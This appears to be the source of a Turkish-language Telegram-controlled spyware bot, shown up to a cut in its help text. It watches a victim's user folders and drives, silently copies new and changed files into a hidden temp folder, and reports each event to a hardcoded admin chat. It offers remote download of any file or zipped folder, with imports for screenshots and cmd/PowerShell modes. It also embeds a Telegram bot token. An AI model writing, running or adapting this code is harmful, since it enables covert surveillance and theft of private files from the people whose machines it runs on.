import os
import telebot
from telebot import types # telebot.types olarak kullanılıyor
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import win32file
import win32con
import win32api
import threading
import platform
import psutil
import concurrent.futures
from datetime import datetime
import subprocess
import socket
from PIL import ImageGrab
from io import BytesIO
import tempfile
import shutil
import uuid
import zipfile
from watchdog.observers import Observer
from watchdog.observers.polling import PollingObserver
from watchdog.events import FileSystemEventHandler
import hashlib
from collections import defaultdict
import ctypes
from send2trash import send2trash

TELEGRAM_TOKEN = "8068043048:AAESMbSsVXgxW7BYae3KDdR88wTd9JVxbRs" # Ana koddan
ADMIN_CHAT_ID = "1753734992" # Ana koddan

bot = telebot.TeleBot(TELEGRAM_TOKEN)
MAX_WORKERS = 3

command_mode = {"cmd": False, "powershell": False}

file_changes = []
max_changes = 2000
last_event_time = defaultdict(float)
EVENT_THROTTLE = 0.5
user_states = {}
available_files = {}
shadow_available_files = {}

FM_MAX_FILE_SIZE = 50 * 1024 * 1024
FM_MAX_ZIP_SIZE = 45 * 1024 * 1024

SYSTEM_FOLDERS = [
    "\\Windows\\", "\\Program Files\\", "\\Program Files (x86)\\", "\\ProgramData\\",
    "\\System Volume Information\\", "\\$Recycle.Bin\\", "\\hiberfil.sys", "\\pagefile.sys",
    "\\AppData\\", "\\appdata\\",
    "\\cache\\", "\\Cache\\", "\\logs\\", "\\Logs\\", "\\temp\\", "\\Temp\\", "\\tmp\\",
    "\\Google\\", "\\Mozilla\\", "\\Microsoft\\", "\\BraveSoftware\\", "\\Opera\\",
    "\\Vivaldi\\", "\\Yandex\\", "\\Safari\\", "\\Chrome\\", "\\Firefox\\", "\\Edge\\",
    "/proc/", "/sys/", "/dev/", "/tmp/", "/var/log/", "/var/cache/", "/var/tmp/",
    "/home/.cache/", "/.cache/", "/snap/", "/usr/share/", "/.config/",
    "/System/", "/Library/Caches/", "/private/var/"
]

FILTERED_EXTENSIONS = [
    '.tmp', '.temp', '.log', '.cache', '.bak', '.old', '.swp', '.lock',
    '.db-journal', '.sqlite-wal', '.sqlite-shm', '.lnk', '.thumbs.db',
    '.desktop.ini', '.ds_store', '.crdownload', '.part', '.download',
    '.pref', '.prefs', '.ini', '.dat', '.idx', '.etl', '.evtx'
]

SHADOW_COPY_ROOT_NAME = ".bot_file_shadows_v1"

def get_shadow_copy_base_dir():
    path = os.path.join(tempfile.gettempdir(), SHADOW_COPY_ROOT_NAME)
    os.makedirs(path, exist_ok=True)
    if platform.system() == "Windows":
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            print(f"Uyarı: Gölge klasörü gizlenemedi: {e}")
    return path

def sanitize_path_component(component):
    if len(component) == 2 and component[1] == ':':
        return component[0] + "_"
    return component.replace(":", "_").replace("\\", "_").replace("/", "_").replace("*", "_").replace("?", "_").replace("\"", "_").replace("<", "_").replace(">", "_").replace("|", "_")

def get_shadow_path(original_path):
    base_shadow_dir = get_shadow_copy_base_dir()
    abs_path = os.path.abspath(original_path)
    path_parts = []
    head, tail = os.path.split(abs_path)
    while tail:
        path_parts.insert(0, sanitize_path_component(tail))
        head, tail = os.path.split(head)
    if head:
        if platform.system() == "Windows" and len(head) == 3 and head[1:3] == ":\\" and head[0].isalpha():
            sanitized_drive_component = sanitize_path_component(head[:2])
            path_parts.insert(0, sanitized_drive_component)
        elif platform.system() != "Windows" and head == "/":
            path_parts.insert(0, "root_")
        else:
            path_parts.insert(0, sanitize_path_component(head.replace(os.sep, "_")))
    if not path_parts:
         path_parts.append(sanitize_path_component(os.path.basename(abs_path) or "unknown_root_file"))
    return os.path.join(base_shadow_dir, *path_parts)

def ensure_shadow_copy(src_path):
    if not os.path.exists(src_path) or should_ignore_file(src_path):
        return False
    shadow_target_path = get_shadow_path(src_path)
    try:
        os.makedirs(os.path.dirname(shadow_target_path), exist_ok=True)
        if os.path.isfile(src_path):
            shutil.copy2(src_path, shadow_target_path)
            print(f"Gölge kopya oluşturuldu/güncellendi: {src_path} -> {shadow_target_path}")
            return True
        elif os.path.isdir(src_path):
            if not os.path.exists(shadow_target_path):
                 os.makedirs(shadow_target_path, exist_ok=True)
                 print(f"Gölge klasör yolu oluşturuldu: {shadow_target_path}")
            return True
    except Exception as e:
        print(f"Gölge kopya hatası ({src_path}): {e}")
    return False

def move_to_recycle_bin_custom(file_path):
    try:
        if os.path.exists(file_path):
            send2trash(file_path)
            print(f"Çöp kutusuna taşındı: {file_path}")
            return True
    except Exception as e:
        print(f"Çöp kutusuna taşıma hatası ({file_path}): {e}")
    return False

def fm_get_all_drives():
    drives = []
    if platform.system() == "Windows":
        for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)
    else:
        drives = ["/"]
    return drives

def get_monitored_folders():
    monitored_folders = []
    if platform.system() == "Windows":
        username = os.getenv('USERNAME')
        if username:
            user_home = f"C:\\Users\\{username}"
            user_folders = [
                os.path.join(user_home, "Desktop"), os.path.join(user_home, "Documents"),
                os.path.join(user_home, "Downloads"), os.path.join(user_home, "Pictures"),
                os.path.join(user_home, "Videos"), os.path.join(user_home, "Music"),
            ]
            monitored_folders.extend([f for f in user_folders if os.path.exists(f)])
        if os.path.exists("D:\\"): monitored_folders.append("D:\\")
        for letter in 'EFGHIJKLMNOPQRSTUVWXYZ':
            drive = f"{letter}:\\"
            if os.path.exists(drive): monitored_folders.append(drive)
    else:
        user_home = os.path.expanduser("~")
        user_folders = [
            os.path.join(user_home, "Desktop"), os.path.join(user_home, "Documents"),
            os.path.join(user_home, "Downloads"), os.path.join(user_home, "Pictures"),
            os.path.join(user_home, "Videos"), os.path.join(user_home, "Music"),
        ]
        monitored_folders.extend([f for f in user_folders if os.path.exists(f)])
    return monitored_folders

def should_ignore_file(file_path):
    try:
        file_path_lower = file_path.lower()
        if get_shadow_copy_base_dir().lower() in file_path_lower:
            return True
        for system_folder in SYSTEM_FOLDERS:
            if system_folder.lower() in file_path_lower: return True
        for ext in FILTERED_EXTENSIONS:
            if file_path_lower.endswith(ext.lower()): return True
        filename = os.path.basename(file_path_lower)
        if filename.startswith('.'):
            important_hidden = ['.txt', '.pdf', '.doc', '.docx', '.jpg', '.png', '.mp4', '.mp3', '.zip', '.rar']
            if not any(filename.endswith(ext) for ext in important_hidden): return True
        system_keywords = ['hiberfil', 'pagefile', 'swapfile', '$recycle']
        for keyword in system_keywords:
            if keyword in filename: return True
        return False
    except Exception as e:
        print(f"Filtreleme hatası ({file_path}): {e}")
        return False

class EnhancedFileMonitorHandler(FileSystemEventHandler):
    def __init__(self):
        super().__init__()

    def should_throttle_event(self, event_key):
        current_time = time.time()
        if current_time - last_event_time[event_key] < EVENT_THROTTLE: return True
        last_event_time[event_key] = current_time
        return False

    def on_any_event(self, event):
        if should_ignore_file(event.src_path):
            return
        if hasattr(event, 'dest_path') and event.dest_path and should_ignore_file(event.dest_path):
            return

        if event.event_type == 'created':
            self.on_created(event)
        elif event.event_type == 'deleted':
            self.on_deleted(event)
        elif event.event_type == 'modified':
            self.on_modified(event)
        elif event.event_type == 'moved':
            self.on_moved(event)

    def on_created(self, event):
        if self.should_throttle_event(f"created:{event.src_path}"): return
        ensure_shadow_copy(event.src_path)
        if event.is_directory:
            self.log_event("FOLDER_CREATED", event.src_path, is_directory=True)
        else:
            self.log_event("FILE_CREATED", event.src_path)

    def on_deleted(self, event):
        if self.should_throttle_event(f"deleted:{event.src_path}"): return
        move_to_recycle_bin_custom(event.src_path)
        if event.is_directory:
            self.log_event("FOLDER_DELETED", event.src_path, is_directory=True)
        else:
            self.log_event("FILE_DELETED", event.src_path)

    def on_modified(self, event):
        if event.is_directory: return
        if self.should_throttle_event(f"modified:{event.src_path}"): return
        ensure_shadow_copy(event.src_path)
        self.log_event("FILE_MODIFIED", event.src_path)

    def on_moved(self, event):
        if self.should_throttle_event(f"moved:{event.src_path}->{event.dest_path}"): return
        old_shadow_path = get_shadow_path(event.src_path)
        new_shadow_path = get_shadow_path(event.dest_path)
        try:
            if os.path.exists(old_shadow_path):
                os.makedirs(os.path.dirname(new_shadow_path), exist_ok=True)
                shutil.move(old_shadow_path, new_shadow_path)
                print(f"Gölge kopya taşındı: {old_shadow_path} -> {new_shadow_path}")
        except Exception as e:
            print(f"Gölge kopya taşıma hatası: {e}")
        ensure_shadow_copy(event.dest_path)
        if event.is_directory:
            self.log_event("FOLDER_MOVED", event.src_path, is_directory=True, dest_path=event.dest_path)
        else:
            self.log_event("FILE_MOVED", event.src_path, dest_path=event.dest_path)

    def log_event(self, event_type, src_path, is_directory=False, dest_path=None):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            file_size_str = "Klasör"
            if not is_directory and os.path.exists(src_path):
                 file_size_str = self.get_file_size(src_path)
            elif not is_directory and dest_path and os.path.exists(dest_path):
                 file_size_str = self.get_file_size(dest_path)
            change_info = {
                "timestamp": timestamp, "event_type": event_type, "file_path": src_path,
                "is_directory": is_directory, "file_size": file_size_str
            }
            if dest_path: change_info["dest_path"] = dest_path
            if event_type in ["FILE_CREATED", "FOLDER_CREATED"] and os.path.exists(src_path):
                file_id = hashlib.md5(f"live_{src_path}{timestamp}".encode()).hexdigest()[:8]
                available_files[file_id] = {
                    'path': src_path, 'name': os.path.basename(src_path),
                    'is_directory': is_directory, 'timestamp': timestamp,
                    'event_type': event_type, 'source': 'live'
                }
            file_changes.append(change_info)
            if len(file_changes) > max_changes: file_changes.pop(0)
            display_path = os.path.basename(src_path) if len(src_path) > 50 else src_path
            print(f"[{timestamp}] {event_type}: {display_path}")
            if event_type in ["FILE_CREATED", "FOLDER_CREATED", "FILE_DELETED", "FOLDER_DELETED"]:
                self.send_immediate_notification(change_info)
        except Exception as e:
            print(f"Log hatası ({event_type}, {src_path}): {e}")

    def send_immediate_notification(self, change_info):
        try:
            emoji_map = {
                'FILE_CREATED': '✅📄', 'FOLDER_CREATED': '✅📁', 'FILE_DELETED': '🗑️📄',
                'FOLDER_DELETED': '🗑️📁', 'FILE_MODIFIED': '✏️📄', 'FILE_MOVED': '➡️📄',
                'FOLDER_MOVED': '➡️📁'
            }
            emoji = emoji_map.get(change_info['event_type'], '🔄')
            notification_text = f"{emoji} **{change_info['event_type'].replace('_', ' ')}**\n"
            notification_text += f"📅 {change_info['timestamp']}\n"
            notification_text += f"📂 `{os.path.basename(change_info['file_path'])}`\n"
            notification_text += f"📍 `{os.path.dirname(change_info['file_path'])}`\n"
            if not change_info['is_directory']:
                notification_text += f"📏 {change_info.get('file_size', 'Bilinmiyor')}\n"
            if 'dest_path' in change_info:
                notification_text += f"➡️ `{change_info['dest_path']}`\n"
            markup = None
            if change_info['event_type'] in ["FILE_CREATED", "FOLDER_CREATED"]:
                file_path = change_info['file_path']
                if os.path.exists(file_path):
                    file_id = hashlib.md5(f"live_{file_path}{change_info['timestamp']}".encode()).hexdigest()[:8]
                    if file_id not in available_files:
                        available_files[file_id] = {
                            'path': file_path, 'name': os.path.basename(file_path),
                            'is_directory': change_info['is_directory'], 'timestamp': change_info['timestamp'],
                            'event_type': change_info['event_type'], 'source': 'live'
                        }
                    markup = types.InlineKeyboardMarkup()
                    send_btn = types.InlineKeyboardButton(
                        f"📤 Bu {'Klasörü' if change_info['is_directory'] else 'Dosyayı'} Gönder (Canlı)",
                        callback_data=f"fm_send_item_{file_id}"
                    )
                    markup.add(send_btn)
            threading.Thread(target=self.send_notification_threaded, args=(notification_text, markup)).start()
        except Exception as e:
            print(f"Bildirim oluşturma hatası: {e}")

    def send_notification_threaded(self, text, markup=None):
        try:
            bot.send_message(int(ADMIN_CHAT_ID), text, parse_mode='Markdown', reply_markup=markup)
        except Exception as e:
            print(f"Telegram gönderim hatası (thread): {e}")

    def get_file_size(self, file_path):
        try:
            if os.path.exists(file_path) and os.path.isfile(file_path):
                size = os.path.getsize(file_path)
                if size < 1024: return f"{size} B"
                elif size < 1024**2: return f"{size/1024:.1f} KB"
                elif size < 1024**3: return f"{size/(1024**2):.1f} MB"
                else: return f"{size/(1024**3):.1f} GB"
        except: pass
        return "Bilinmiyor"

def fm_create_zip_file(source_path, max_size=FM_MAX_ZIP_SIZE):
    try:
        temp_dir = tempfile.mkdtemp()
        base_name = os.path.basename(source_path)
        zip_path = os.path.join(temp_dir, f"{base_name}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            current_size = 0
            skipped_files = []
            if os.path.isdir(source_path):
                for root, dirs, files in os.walk(source_path):
                    for file in files:
                        file_path_in_zip = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path_in_zip)
                            if current_size + file_size > max_size:
                                skipped_files.append(os.path.relpath(file_path_in_zip, source_path))
                                continue
                            arcname = os.path.relpath(file_path_in_zip, source_path)
                            zipf.write(file_path_in_zip, arcname)
                            current_size += file_size
                        except Exception as e:
                            skipped_files.append(f"{os.path.relpath(file_path_in_zip, source_path)} (Hata: {e})")
            elif os.path.isfile(source_path):
                 if os.path.getsize(source_path) <= max_size:
                    zipf.write(source_path, os.path.basename(source_path))
                 else:
                    skipped_files.append(os.path.basename(source_path))
        zip_size = os.path.getsize(zip_path)
        return zip_path, zip_size, skipped_files
    except Exception as e:
        return None, 0, [f"ZIP oluşturma hatası: {e}"]

def fm_get_file_info_generic(file_path, is_shadow=False):
    try:
        if not os.path.exists(file_path): return None
        stat_info = os.stat(file_path)
        is_dir = os.path.isdir(file_path)
        info = {
            'name': os.path.basename(file_path), 'path': file_path,
            'size': stat_info.st_size if not is_dir else 0, 'is_directory': is_dir,
            'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
            'source': 'shadow' if is_shadow else 'live'
        }
        if is_dir:
            total_size, file_count, folder_count = 0, 0, 0
            for root, dirs, files in os.walk(file_path):
                folder_count += len(dirs)
                file_count += len(files)
                for file in files:
                    try: total_size += os.path.getsize(os.path.join(root, file))
                    except: pass
            info['total_size'] = total_size
            info['file_count'] = file_count
            info['folder_count'] = folder_count
        return info
    except Exception: return None

def fm_format_size(size_bytes):
    if size_bytes == 0: return "0 B"
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size_bytes < 1024.0: return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.1f} PB"

def fm_get_system_info():
    try: ram_gb = f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB"
    except: ram_gb = "N/A"
    try: processor_info = platform.processor() or "N/A"
    except: processor_info = "N/A"
    return {
        "platform": platform.system(), "platform_release": platform.release(),
        "platform_version": platform.version(), "architecture": platform.machine(),
        "hostname": platform.node(), "processor": processor_info, "ram": ram_gb
    }

def fm_start_monitoring():
    try: observer = Observer()
    except: observer = PollingObserver()
    observer_type = type(observer).__name__
    event_handler = EnhancedFileMonitorHandler()
    monitored_folders = get_monitored_folders()
    successful_folders, failed_folders = [], []
    for folder in monitored_folders:
        try:
            observer.schedule(event_handler, folder, recursive=True)
            successful_folders.append(folder)
            print(f"✅ İzleniyor: {folder}")
        except Exception as e:
            failed_folders.append(f"{folder} - Hata: {e}")
            print(f"❌ İzlenemedi: {folder} - {e}")
    observer.start()
    report = f"🚀 **Dosya İzleme Başlatıldı**\n📊 **Observer Tipi:** {observer_type}\n\n"
    report += f"✅ **Başarıyla İzlenen Klasörler ({len(successful_folders)}):**\n" + "\n".join([f"• `{f}`" for f in successful_folders])
    if failed_folders:
        report += f"\n\n❌ **İzlenemeyen Klasörler ({len(failed_folders)}):**\n" + "\n".join([f"• `{f}`" for f in failed_folders])
    try: bot.send_message(int(ADMIN_CHAT_ID), report, parse_mode='Markdown')
    except: pass
    return observer

def fm_send_single_file_generic(chat_id, file_path, info):
    try:
        file_size = info['size']
        source_tag = "(Gölge Kopya)" if info.get('source') == 'shadow' else "(Canlı)"
        if file_size > FM_MAX_FILE_SIZE:
            bot.send_message(chat_id,
                f"❌ **Dosya çok büyük! {source_tag}**\n\n"
                f"📄 **Dosya:** `{info['name']}`\n📏 **Boyut:** {fm_format_size(file_size)}\n"
                f"⚠️ **Limit:** {fm_format_size(FM_MAX_FILE_SIZE)}\nDosya Telegram limitini aşıyor.",
                parse_mode='Markdown')
            return
        if file_size == 0:
            with tempfile.NamedTemporaryFile(delete=False, suffix="_"+info['name']) as tmp_file:
                tmp_file_path = tmp_file.name
            with open(tmp_file_path, 'rb') as f_to_send:
                 bot.send_document(chat_id, f_to_send, caption=f"📄 {info['name']} {source_tag} (Boş dosya)")
            os.unlink(tmp_file_path)
            return
        progress_msg = bot.send_message(chat_id, f"📤 **Dosya gönderiliyor... {source_tag}**", parse_mode='Markdown')
        with open(file_path, 'rb') as f:
            caption = f"📄 **{info['name']}** {source_tag}\n📏 {fm_format_size(file_size)}\n🕒 {info['modified']}"
            bot.send_document(chat_id, f, caption=caption, parse_mode='Markdown')
        bot.delete_message(chat_id, progress_msg.message_id)
        bot.send_message(chat_id, f"✅ **Dosya başarıyla gönderildi! {source_tag}**", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ **Dosya gönderilemedi {source_tag}:** `{str(e)}`", parse_mode='Markdown')
        print(f"Dosya gönderme hatası ({file_path}): {e}")

def fm_send_folder_as_zip_generic(chat_id, folder_path, info):
    try:
        folder_name = info['name']
        total_size = info.get('total_size', 0)
        source_tag = "(Gölge Kopya)" if info.get('source') == 'shadow' else "(Canlı)"
        if total_size > FM_MAX_ZIP_SIZE * 5 :
            bot.send_message(chat_id,
                f"❌ **Klasör çok büyük olabilir! {source_tag}**\n\n"
                f"📁 **Klasör:** `{folder_name}`\n📏 **Toplam Boyut:** {fm_format_size(total_size)}\n"
                f"⚠️ **Tahmini ZIP Limiti:** {fm_format_size(FM_MAX_ZIP_SIZE)}\n"
                f"Klasörün ZIP'lenmiş hali büyük olabilir, yine de denenecek.",
                parse_mode='Markdown')
        progress_msg = bot.send_message(chat_id,
            f"📦 **ZIP oluşturuluyor... {source_tag}**\n📁 `{folder_name}`\n"
            f"📄 {info.get('file_count',0)} dosya, {info.get('folder_count',0)} klasör\n📏 {fm_format_size(total_size)}",
            parse_mode='Markdown')
        zip_path, zip_size, skipped_files = fm_create_zip_file(folder_path, FM_MAX_ZIP_SIZE)
        if not zip_path or not os.path.exists(zip_path) or zip_size == 0:
            error_detail = "Oluşturulan ZIP boş veya bulunamadı."
            if skipped_files and "ZIP oluşturma hatası" in skipped_files[0]: error_detail = skipped_files[0]
            bot.edit_message_text(f"❌ **ZIP oluşturulamadı! {source_tag}**\n{error_detail}",
                                chat_id, progress_msg.message_id, parse_mode='Markdown')
            if zip_path and os.path.exists(os.path.dirname(zip_path)): shutil.rmtree(os.path.dirname(zip_path), ignore_errors=True)
            return
        if zip_size > FM_MAX_FILE_SIZE:
             bot.edit_message_text(
                f"❌ **Oluşturulan ZIP dosyası çok büyük! {source_tag}**\n\n"
                f"📦 **ZIP:** `{os.path.basename(zip_path)}`\n"
                f"📏 **Boyut:** {fm_format_size(zip_size)}\n"
                f"⚠️ **Telegram Limiti:** {fm_format_size(FM_MAX_FILE_SIZE)}\n\n"
                f"ZIP dosyası gönderilemiyor.",
                chat_id, progress_msg.message_id, parse_mode='Markdown')
             if zip_path and os.path.exists(os.path.dirname(zip_path)): shutil.rmtree(os.path.dirname(zip_path), ignore_errors=True)
             return
        bot.edit_message_text(f"📤 **ZIP gönderiliyor... {source_tag}**", chat_id, progress_msg.message_id, parse_mode='Markdown')
        with open(zip_path, 'rb') as f:
            caption = f"📦 **{folder_name}.zip** {source_tag}\n📏 {fm_format_size(zip_size)}"
            if skipped_files: caption += f"\n⚠️ {len(skipped_files)} dosya atlandı (boyut/hata)"
            bot.send_document(chat_id, f, caption=caption, parse_mode='Markdown')
        shutil.rmtree(os.path.dirname(zip_path), ignore_errors=True)
        bot.delete_message(chat_id, progress_msg.message_id)
        success_msg = f"✅ **Klasör ZIP olarak gönderildi! {source_tag}**"
        if skipped_files:
            success_msg += f"\n\n⚠️ **Atlanan dosyalar ({len(skipped_files)}):**\n" + "\n".join([f"• `{s}`" for s in skipped_files[:5]])
            if len(skipped_files) > 5: success_msg += f"\n• ... ve {len(skipped_files)-5} dosya daha"
        bot.send_message(chat_id, success_msg, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ **ZIP gönderilemedi {source_tag}:** `{str(e)}`", parse_mode='Markdown')
        if 'progress_msg' in locals() and progress_msg:
            try: bot.delete_message(chat_id, progress_msg.message_id)
            except: pass
        print(f"ZIP gönderme hatası ({folder_path}): {e}")

def fm_show_available_live_files(chat_id):
    if not available_files:
        bot.send_message(chat_id, "📂 **Gönderilecek yeni *canlı* dosya/klasör bulunamadı.**\nDosya/klasör oluşturulduğunda buraya eklenir.\nEski yedekler için `Gölge Kopyalar` butonunu kullanın.", parse_mode='Markdown')
        return
    msg_text = "📤 **Son Oluşturulan Canlı Dosya/Klasörler:**\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    recent_live_files = {k: v for k, v in sorted(available_files.items(), key=lambda item: item[1]['timestamp'], reverse=True)[:20] if os.path.exists(v['path'])}
    if not recent_live_files:
        bot.send_message(chat_id, "📂 **Listelenecek geçerli canlı dosya/klasör bulunamadı (öncekiler silinmiş olabilir).**\nEski yedekler için `Gölge Kopyalar` butonunu kullanın.", parse_mode='Markdown')
        return
    for file_id, file_info in recent_live_files.items():
        icon = "📁" if file_info['is_directory'] else "📄"
        btn_text = f"{icon} {file_info['name'][:25]}{'...' if len(file_info['name']) > 25 else ''} (Canlı - {file_info['timestamp'].split(' ')[1]})"
        markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"fm_send_item_{file_id}"))
    if len(available_files) > len(recent_live_files):
        msg_text += f"_{len(recent_live_files)} en yeni canlı öğe gösteriliyor (toplam {len(available_files)} algılandı)._\n"
    bot.send_message(chat_id, msg_text + "\n📤 **Göndermek istediğinize tıklayın:**", parse_mode='Markdown', reply_markup=markup)

def fm_show_shadow_copies(chat_id):
    shadow_base_dir = get_shadow_copy_base_dir()
    shadow_available_files.clear()
    max_list_items = 20
    listed_item_count = 0
    all_shadow_items = []
    for root, dirs, files in os.walk(shadow_base_dir):
        for item_name in dirs + files:
            item_path = os.path.join(root, item_name)
            try:
                mtime = os.path.getmtime(item_path)
                all_shadow_items.append({'path': item_path, 'mtime': mtime, 'name': item_name, 'is_directory': os.path.isdir(item_path)})
            except OSError:
                continue
    all_shadow_items.sort(key=lambda x: x['mtime'], reverse=True)
    markup = types.InlineKeyboardMarkup(row_width=1)
    msg_text = "🗄️ **Gölge Kopyalanmış Dosya/Klasörler (En Yeniler):**\n\n"
    if not all_shadow_items:
        bot.send_message(chat_id, "📂 **Gönderilecek gölge kopya bulunamadı.**", parse_mode='Markdown')
        return
    for item_data in all_shadow_items:
        if listed_item_count >= max_list_items:
            break
        item_path = item_data['path']
        item_name = item_data['name']
        is_directory = item_data['is_directory']
        relative_to_shadow_base = os.path.relpath(item_path, shadow_base_dir)
        parts = relative_to_shadow_base.split(os.sep)
        original_like_path_str = ""
        if parts:
            first_part = parts[0]
            remaining_parts = parts[1:]
            if platform.system() == "Windows" and len(first_part) == 2 and first_part[1] == '_' and first_part[0].isalpha():
                drive_letter = first_part[0] + ":"
                if remaining_parts:
                    original_like_path_str = os.path.join(drive_letter + os.sep, *remaining_parts)
                else:
                    original_like_path_str = drive_letter + os.sep
            elif first_part == "root_":
                if remaining_parts:
                    original_like_path_str = os.path.join(os.sep, *remaining_parts)
                else:
                    original_like_path_str = os.sep
            else:
                original_like_path_str = relative_to_shadow_base
        else:
            original_like_path_str = relative_to_shadow_base
        file_id = hashlib.md5(f"shadow_{item_path}".encode()).hexdigest()[:8]
        shadow_available_files[file_id] = {
            'path': item_path, 'name': item_name,
            'is_directory': is_directory,
            'timestamp': datetime.fromtimestamp(item_data['mtime']).strftime("%Y-%m-%d %H:%M:%S"),
            'original_path_hint': original_like_path_str,
            'source': 'shadow'
        }
        icon = "📁" if is_directory else "📄"
        hint_display = original_like_path_str
        if len(hint_display) > 30:
            hint_display = "..." + hint_display[-27:]
        btn_text = f"{icon} {item_name[:20]}{'...' if len(item_name)>20 else ''} ({hint_display})"
        markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"fm_send_item_{file_id}"))
        listed_item_count +=1
    if not listed_item_count:
        bot.send_message(chat_id, "📂 **Gönderilecek geçerli gölge kopya bulunamadı.**", parse_mode='Markdown')
        return
    if len(all_shadow_items) > listed_item_count:
        msg_text += f"_{listed_item_count} en yeni gölge öğe gösteriliyor (toplam {len(all_shadow_items)} öğe tarandı)._\n"
    bot.send_message(chat_id, msg_text + "\n📤 **Göndermek istediğinize tıklayın:**", parse_mode='Markdown', reply_markup=markup)

def fm_show_file_monitoring_welcome(chat_id):
    system_info = fm_get_system_info()
    monitored_folders = get_monitored_folders()
    welcome_text = f"""
🤖 **Gelişmiş Dosya İzleme Modülü**
    Gölge Kopya ve Çöp Kutusu Özellikli

💻 **Sistem Bilgileri (İzleme İçin):**
Platform: {system_info['platform']} {system_info['platform_release']}
Hostname: {system_info['hostname']}
İşlemci: {system_info['processor']}
RAM: {system_info['ram']}

📁 **İzlenen Ana Klasörler ({len(monitored_folders)}):**
{chr(10).join([f"- `{folder}`" for folder in monitored_folders])}

🛡️ **Gölge Kopya Dizini:** `{get_shadow_copy_base_dir()}`

Aşağıdaki butonları kullanarak işlem yapabilirsiniz.
    """
    bot.send_message(chat_id, welcome_text, parse_mode='Markdown', reply_markup=file_monitoring_submenu())

def fm_show_changes(chat_id):
    if not file_changes: bot.send_message(chat_id, "Henüz değişiklik kaydedilmedi."); return
    recent_changes = file_changes[-25:]
    change_text = f"📝 **Son {len(recent_changes)} Dosya Değişikliği (Canlı Sistem):**\n\n"
    for change in reversed(recent_changes):
        emoji_map = {
            'FILE_CREATED': '✅📄', 'FOLDER_CREATED': '✅📁', 'FILE_DELETED': '🗑️📄',
            'FOLDER_DELETED': '🗑️📁', 'FILE_MODIFIED': '✏️📄', 'FILE_MOVED': '➡️📄',
            'FOLDER_MOVED': '➡️📁'
        }
        emoji = emoji_map.get(change['event_type'], '🔄')
        change_text += f"{emoji} **{change['event_type'].replace('_', ' ')}**\n"
        change_text += f"📅 {change['timestamp']}\n📂 `{os.path.basename(change['file_path'])}`\n"
        change_text += f"📍 `{os.path.dirname(change['file_path'])}`\n"
        if not change.get('is_directory', False):
            change_text += f"📏 {change.get('file_size', 'Bilinmiyor')}\n"
        if 'dest_path' in change:
            change_text += f"➡️ `{os.path.basename(change['dest_path'])}` ({os.path.dirname(change['dest_path'])})\n"
        change_text += "\n"
    for i in range(0, len(change_text), 4000):
        bot.send_message(chat_id, change_text[i:i+4000], parse_mode='Markdown')
    bot.send_message(chat_id, "Dosya İzleme Menüsü:", reply_markup=file_monitoring_submenu())


def fm_show_stats(chat_id):
    if not file_changes: bot.send_message(chat_id, "Henüz istatistik verisi yok."); return
    event_counts = defaultdict(int)
    for change in file_changes: event_counts[change['event_type']] += 1
    stats_text = f"📊 **Dosya İzleme İstatistikleri**\n\n📈 **Toplam Değişiklik:** {len(file_changes)}\n\n📋 **Değişiklik Türleri:**\n"
    emoji_map = {
        'FILE_CREATED': '✅📄', 'FOLDER_CREATED': '✅📁', 'FILE_DELETED': '🗑️📄',
        'FOLDER_DELETED': '🗑️📁', 'FILE_MODIFIED': '✏️📄', 'FILE_MOVED': '➡️📄',
        'FOLDER_MOVED': '➡️📁'
    }
    for event_type, count in event_counts.items():
        stats_text += f"{emoji_map.get(event_type, '🔄')} {event_type.replace('_', ' ')}: {count}\n"
    if file_changes:
        stats_text += f"\n🕒 **Son Değişiklik:** {file_changes[-1]['timestamp']}\n"
        stats_text += f"📂 **Son Dosya:** `{os.path.basename(file_changes[-1]['file_path'])}`"
    bot.send_message(chat_id, stats_text, parse_mode='Markdown', reply_markup=file_monitoring_submenu())

def fm_show_filter_info(chat_id):
    monitored_folders = get_monitored_folders()
    filter_text = f"""
🔍 **Filtreleme ve İzleme Ayarları**
✅ **İzlenen Ana Klasörler ({len(monitored_folders)}):**
{chr(10).join([f"• `{folder}`" for folder in monitored_folders])}

🛡️ **Gölge Kopya:** Aktif, `{get_shadow_copy_base_dir()}` dizinine.
🗑️ **Çöp Kutusu:** Silinen dosyalar çöp kutusuna gönderilir.

❌ **Filtrelenen (İzlenmeyen ve Kopyalanmayan) Öğeler:**
• Sistem klasörleri (Windows, Program Files, AppData vb.)
• Tarayıcı klasörleri (Chrome, Firefox, vb.)
• Geçici dosyalar (.tmp, .log, .cache vb.)
• Belirli sistem dosyaları (.lnk, .ini, hiberfil.sys vb.)
• Gizli dosyalar (önemli uzantılar hariç)
• Gölge kopya dizininin kendisi
    """
    bot.send_message(chat_id, filter_text, parse_mode='Markdown', reply_markup=file_monitoring_submenu())

def fm_show_file_monitoring_help(chat_id):
    observer_instance_type = "Observer"
    try:
        Observer()
    except:
        observer_instance_type = "PollingObserver"
    help_text = f"""
🆘 **Gelişmiş Dosya İzleme Modülü - Yardım**

**🎯 Ana Özellikler:**
• Tüm sürücüleri izler (örn: C:, D:).
• Dosya/Klasör oluşturma, silme, düzenleme, taşıma algılar.
• Anında Telegram bildirimleri.
• **Gölge Kopya:** Değişiklikler gizli bir temp klasörüne yedeklenir.
• **Çöp Kutusu:** Silinen dosyalar sistemin çöp kutusuna gönderilir.
• Dosya ve klasörleri (ZIP olarak) canlı veya gölge kopyadan gönderme.

**📱 Butonlar (Dosya İzleme Menüsünde):**
• **Karşılama:** Bu modülün genel durumunu gösterir.
